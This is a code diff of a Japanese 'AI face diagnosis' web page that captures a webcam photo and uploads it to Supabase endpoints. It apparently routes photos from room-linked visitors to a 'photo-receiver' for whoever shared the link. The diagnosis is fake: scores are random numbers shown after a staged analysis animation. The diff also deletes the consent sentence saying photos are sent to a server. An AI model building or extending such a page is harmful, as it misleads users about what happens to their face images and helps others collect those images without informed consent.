@@ -240,8 +240,6 @@ video,
 
 <h1>✨ AI顔診断</h1>
 
-<!-- START -->
-
 <div id="startArea">
 
 <p>あなたの名前またはニックネームを入力してください</p>
@@ -249,7 +247,7 @@ video,
 <input
   type="text"
   id="nickname"
-  placeholder="ニックネーム"
+  placeholder="名前orニックネーム"
 >
 
 <div class="consent">
@@ -258,11 +256,11 @@ video,
 
 <p>
 AI顔診断を行うため、カメラで顔写真を撮影します。
-撮影した写真はサーバーへ送信され、AIが不正チェックを行います。
+撮影した写真は、診断に必要な処理のためAIが不正チェックを行います。
 </p>
 
 <p>
-写真は診断後自動削除されます。
+写真は診断後に自動削除されます。
 </p>
 
 <label>
@@ -278,8 +276,6 @@ AI顔診断を行うため、カメラで顔写真を撮影します。
 
 </div>
 
-
-<!-- CAMERA -->
 
 <div id="cameraArea">
 
@@ -299,8 +295,6 @@ AI顔診断を行うため、カメラで顔写真を撮影します。
 
 </div>
 
-
-<!-- PHOTO -->
 
 <div id="resultArea">
 
@@ -322,8 +316,6 @@ AI顔診断を行うため、カメラで顔写真を撮影します。
 </div>
 
 
-<!-- COMPLETE -->
-
 <div id="completeArea">
 
 <h2>📤 送信完了</h2>
@@ -334,8 +326,6 @@ AI顔診断を行うため、カメラで顔写真を撮影します。
 
 </div>
 
-
-<!-- LOADING -->
 
 <div id="loadingArea">
 
@@ -374,8 +364,6 @@ AI顔診断を行うため、カメラで顔写真を撮影します。
 
 </div>
 
-
-<!-- RESULT -->
 
 <div id="diagnosisArea">
 
@@ -499,9 +487,41 @@ RANK -
 
 <script>
 
-/* =========================
-   要素取得
-   ========================= */
+/*
+========================================
+送信先
+========================================
+*/
+
+// 通常のAI診断
+const SMOOTH_WORKER_URL =
+  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/smooth-worker";
+
+// リンク経由の写真受信
+const PHOTO_RECEIVER_URL =
+  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";
+
+
+/*
+========================================
+URLのroomを最初に確定
+========================================
+*/
+
+const urlParams =
+  new URLSearchParams(
+    window.location.search
+  );
+
+const room =
+  urlParams.get("room");
+
+
+/*
+========================================
+画面
+========================================
+*/
 
 const startArea =
   document.getElementById("startArea");
@@ -554,13 +574,6 @@ const analysisProgress =
 const analysisPercent =
   document.getElementById("analysisPercent");
 
-const analysisStep =
-  document.getElementById("analysisStep");
-
-
-/* =========================
-   状態
-   ========================= */
 
 let cameraStream = null;
 let photoBlob = null;
@@ -572,26 +585,15 @@ let finalPhoto = 0;
 let finalRank = "";
 
 
-/* =========================
-   ルームID取得
-   ========================= */
-
-const urlParams =
-  new URLSearchParams(
-    window.location.search
-  );
-
-const room =
-  urlParams.get("room");
-
-
-/* =========================
-   同意チェック
-   ========================= */
+/*
+========================================
+同意チェック
+========================================
+*/
 
 consent.addEventListener(
   "change",
-  function () {
+  () => {
 
     startButton.disabled =
       !consent.checked;
@@ -600,24 +602,15 @@ consent.addEventListener(
 );
 
 
-/* =========================
-   カメラ開始
-   ========================= */
+/*
+========================================
+カメラ開始
+========================================
+*/
 
 startButton.addEventListener(
   "click",
-  async function () {
-
-    if (!consent.checked) {
-
-      alert(
-        "写真の撮影・送信に同意してください"
-      );
-
-      return;
-
-    }
-
+  async () => {
 
     if (!nickname.value.trim()) {
 
@@ -625,30 +618,10 @@ startButton.addEventListener(
         "ニックネームを入力してください"
       );
 
-      nickname.focus();
-
       return;
-
     }
-
-
-    if (
-      !navigator.mediaDevices ||
-      !navigator.mediaDevices.getUserMedia
-    ) {
-
-      alert(
-        "このブラウザではカメラを使用できません。HTTPSのページで開いてください。"
-      );
-
-      return;
-
-    }
-
 
     try {
-
-      startButton.disabled = true;
 
       cameraStream =
         await navigator.mediaDevices.getUserMedia({
@@ -661,10 +634,8 @@ startButton.addEventListener(
 
         });
 
-
       camera.srcObject =
         cameraStream;
-
 
       startArea.style.display =
         "none";
@@ -672,16 +643,12 @@ startButton.addEventListener(
       cameraArea.style.display =
         "block";
 
-
     } catch (error) {
 
       console.error(error);
 
-      startButton.disabled =
-        false;
-
       alert(
-        "カメラを起動できませんでした。カメラの使用を許可してください。"
+        "カメラを起動できませんでした。"
       );
 
     }
@@ -690,31 +657,18 @@ startButton.addEventListener(
 );
 
 
-/* =========================
-   撮影
-   ========================= */
+/*
+========================================
+撮影
+========================================
+*/
 
 captureButton.addEventListener(
   "click",
-  function () {
-
-    if (
-      !camera.videoWidth ||
-      !camera.videoHeight
-    ) {
-
-      alert(
-        "カメラの準備が完了していません。"
-      );
-
-      return;
-
-    }
-
+  () => {
 
     const canvas =
       document.createElement("canvas");
-
 
     canvas.width =
       camera.videoWidth;
@@ -722,12 +676,8 @@ captureButton.addEventListener(
     canvas.height =
       camera.videoHeight;
 
-
     const ctx =
       canvas.getContext("2d");
-
-
-    /* ミラー撮影 */
 
     ctx.translate(
       canvas.width,
@@ -739,7 +689,6 @@ captureButton.addEventListener(
       1
     );
 
-
     ctx.drawImage(
       camera,
       0,
@@ -748,30 +697,35 @@ captureButton.addEventListener(
       canvas.height
     );
 
-
     photo.src =
       canvas.toDataURL(
         "image/jpeg",
         0.9
       );
 
-
     canvas.toBlob(
-      function (blob) {
+      (blob) => {
 
-        photoBlob =
-          blob;
+        photoBlob = blob;
 
       },
       "image/jpeg",
       0.9
     );
 
+    if (cameraStream) {
 
-    /* カメラ停止 */
+      cameraStream
+        .getTracks()
+        .forEach(
+          track =>
+            track.stop()
+        );
 
-    stopCamera();
+      cameraStream =
+        null;
 
+    }
 
     cameraArea.style.display =
       "none";
@@ -783,58 +737,39 @@ captureButton.addEventListener(
 );
 
 
-/* =========================
-   カメラ停止
-   ========================= */
+/*
+========================================
+写真送信
+========================================
 
-function stopCamera() {
+重要：
 
-  if (!cameraStream) {
-    return;
-  }
+roomあり
+↓
+photo-receiverだけ
 
+roomなし
+↓
+smooth-workerだけ
 
-  cameraStream
-    .getTracks()
-    .forEach(
-      function (track) {
-        track.stop();
-      }
-    );
-
-
-  cameraStream =
-    null;
-
-  camera.srcObject =
-    null;
-
-}
-
-
-/* =========================
-   写真送信
-   ========================= */
+この2つを絶対に同時実行しない。
+========================================
+*/
 
 sendButton.addEventListener(
   "click",
-  async function () {
+  async () => {
 
     if (!photoBlob) {
 
       alert(
-        "写真がありません。もう一度撮影してください。"
+        "写真がありません"
       );
 
       return;
-
     }
 
-
     sendButton.disabled =
-      true;
-
-    retakeButton.disabled =
       true;
 
     sendButton.textContent =
@@ -846,17 +781,27 @@ sendButton.addEventListener(
       let response;
 
 
-      /* =========================
-         Roomリンクの場合
-         photo-receiverだけに送信
-         ========================= */
+      /*
+      --------------------------------
+      ROOM付きURL
+      --------------------------------
+      */
 
       if (room) {
 
+        /*
+        room付きの場合は
+        photo-receiverにしか送信しない。
+        */
+
+        const receiverUrl =
+          PHOTO_RECEIVER_URL +
+          "?room=" +
+          encodeURIComponent(room);
+
         response =
           await fetch(
-            "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver?room=" +
-            encodeURIComponent(room),
+            receiverUrl,
             {
               method: "POST",
 
@@ -865,25 +810,29 @@ sendButton.addEventListener(
                   "image/jpeg"
               },
 
-              body:
-                photoBlob
-
+              body: photoBlob
             }
           );
 
       }
 
 
-      /* =========================
-         通常アクセスの場合
-         smooth-workerに送信
-         ========================= */
+      /*
+      --------------------------------
+      ROOMなしURL
+      --------------------------------
+      */
 
       else {
 
+        /*
+        roomなしの場合だけ
+        smooth-workerを使用する。
+        */
+
         response =
           await fetch(
-            "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/smooth-worker",
+            SMOOTH_WORKER_URL,
             {
               method: "POST",
 
@@ -892,24 +841,34 @@ sendButton.addEventListener(
                   "image/jpeg"
               },
 
-              body:
-                photoBlob
-
+              body: photoBlob
             }
           );
 
       }
 
+
+      /*
+      --------------------------------
+      送信結果チェック
+      --------------------------------
+      */
 
       if (!response.ok) {
 
         throw new Error(
-          "写真送信失敗: " +
+          "写真の送信に失敗しました。HTTP " +
           response.status
         );
 
       }
 
+
+      /*
+      --------------------------------
+      送信成功
+      --------------------------------
+      */
 
       resultArea.style.display =
         "none";
@@ -926,17 +885,16 @@ sendButton.addEventListener(
 
     } catch (error) {
 
-      console.error(error);
-
-      alert(
-        "写真の送信に失敗しました。もう一度試してください。"
+      console.error(
+        "写真送信エラー:",
+        error
       );
 
+      alert(
+        "写真の送信に失敗しました。"
+      );
 
       sendButton.disabled =
-        false;
-
-      retakeButton.disabled =
         false;
 
       sendButton.textContent =
@@ -948,20 +906,18 @@ sendButton.addEventListener(
 );
 
 
-/* =========================
-   再撮影
-   ========================= */
+/*
+========================================
+再撮影
+========================================
+*/
 
 retakeButton.addEventListener(
   "click",
-  async function () {
-
-    stopCamera();
-
+  async () => {
 
     resultArea.style.display =
       "none";
-
 
     try {
 
@@ -976,31 +932,15 @@ retakeButton.addEventListener(
 
         });
 
-
       camera.srcObject =
         cameraStream;
-
 
       cameraArea.style.display =
         "block";
 
-
-      sendButton.disabled =
-        false;
-
-      retakeButton.disabled =
-        false;
-
-      sendButton.textContent =
-        "写真を送信する";
-
-
     } catch (error) {
 
       console.error(error);
-
-      resultArea.style.display =
-        "block";
 
       alert(
         "カメラを起動できませんでした。"
@@ -1012,9 +952,11 @@ retakeButton.addEventListener(
 );
 
 
-/* =========================
-   解析演出
-   ========================= */
+/*
+========================================
+解析演出
+========================================
+*/
 
 function startDiagnosis() {
 
@@ -1024,15 +966,11 @@ function startDiagnosis() {
   loadingArea.style.display =
     "block";
 
-
   analysisProgress.style.width =
     "0%";
 
   analysisPercent.textContent =
     "0%";
-
-  analysisStep.textContent =
-    "診断処理を開始しています…";
 
 
   const steps = [
@@ -1061,14 +999,13 @@ function startDiagnosis() {
 
   const timer =
     setInterval(
-      function () {
+      () => {
 
         percent += 1;
 
 
         analysisProgress.style.width =
           percent + "%";
-
 
         analysisPercent.textContent =
           percent + "%";
@@ -1084,7 +1021,9 @@ function startDiagnosis() {
           );
 
 
-        analysisStep.textContent =
+        document.getElementById(
+          "analysisStep"
+        ).textContent =
           steps[stepIndex];
 
 
@@ -1107,9 +1046,11 @@ function startDiagnosis() {
 }
 
 
-/* =========================
-   診断結果
-   ========================= */
+/*
+========================================
+診断結果
+========================================
+*/
 
 function createDiagnosis() {
 
@@ -1153,7 +1094,9 @@ function createDiagnosis() {
     " さんの診断結果";
 
 
-  /* 数字アニメーション */
+  /*
+  数字アニメーション
+  */
 
   animateNumber(
     "totalScore",
@@ -1180,7 +1123,9 @@ function createDiagnosis() {
   );
 
 
-  /* ランク */
+  /*
+  ランク
+  */
 
   let rank;
 
@@ -1222,7 +1167,9 @@ function createDiagnosis() {
     "RANK " + rank;
 
 
-  /* コメント */
+  /*
+  コメント
+  */
 
   const comments = [
 
@@ -1250,17 +1197,16 @@ function createDiagnosis() {
     ];
 
 
-  loadingArea.style.display =
-    "none";
-
   diagnosisArea.style.display =
     "block";
 
 
-  /* ゲージ */
+  /*
+  ゲージ
+  */
 
   setTimeout(
-    function () {
+    () => {
 
       document.getElementById(
         "expressionBar"
@@ -1286,13 +1232,15 @@ function createDiagnosis() {
 }
 
 
-/* =========================
-   シェア
-   ========================= */
+/*
+========================================
+シェア
+========================================
+*/
 
 shareButton.addEventListener(
   "click",
-  async function () {
+  async () => {
 
     const shareText =
       "✨ AI顔診断結果 ✨\n\n" +
@@ -1313,7 +1261,7 @@ shareButton.addEventListener(
       finalRank +
       "\n\n" +
       "あなたもAI顔診断してみて！\n" +
-      window.location.href;
+      location.href;
 
 
     try {
@@ -1331,7 +1279,7 @@ shareButton.addEventListener(
             shareText,
 
           url:
-            window.location.href
+            location.href
 
         });
 
@@ -1366,9 +1314,11 @@ shareButton.addEventListener(
 );
 
 
-/* =========================
-   数字アニメーション
-   ========================= */
+/*
+========================================
+数字アニメーション
+========================================
+*/
 
 function animateNumber(
   elementId,
@@ -1435,9 +1385,11 @@ function animateNumber(
 }
 
 
-/* =========================
-   スコア
-   ========================= */
+/*
+========================================
+スコア
+========================================
+*/
 
 function randomScore() {
 
@@ -1446,20 +1398,6 @@ function randomScore() {
   ) + 70;
 
 }
-
-
-/* =========================
-   ページ終了時にカメラ停止
-   ========================= */
-
-window.addEventListener(
-  "beforeunload",
-  function () {
-
-    stopCamera();
-
-  }
-);
 
 </script>
 
